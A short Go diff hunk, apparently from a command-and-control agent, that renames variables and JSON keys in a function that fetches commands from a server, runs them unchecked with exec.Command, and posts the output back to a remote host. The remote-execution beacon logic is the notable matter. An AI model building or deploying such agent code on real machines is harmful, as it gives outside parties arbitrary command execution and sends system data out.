@@ -77,16 +77,16 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 		time.Sleep(sleepTime * time.Second)
 	} else {
 		fmt.Println("Received command")
-		commandID := tokens[1]
+		command_id := tokens[1]
 		args := strings.Split(command, " ")
 		parsed_command := args[0]
 		args = args[1:]
 		out, _ := exec.Command(parsed_command, args...).Output()
 		output := string(out[:])
 		resp_body, _ := json.Marshal(map[string]string{
-			"agentID":   agent_id,
-			"commandID": commandID,
-			"output":    output,
+			"agent_id":   agent_id,
+			"command_id": command_id,
+			"output":     output,
 		})
 		responseBody := bytes.NewBuffer(resp_body)
 		http.Post("https://"+serverIP+"/api/1.1/command_out", "application/json", responseBody)
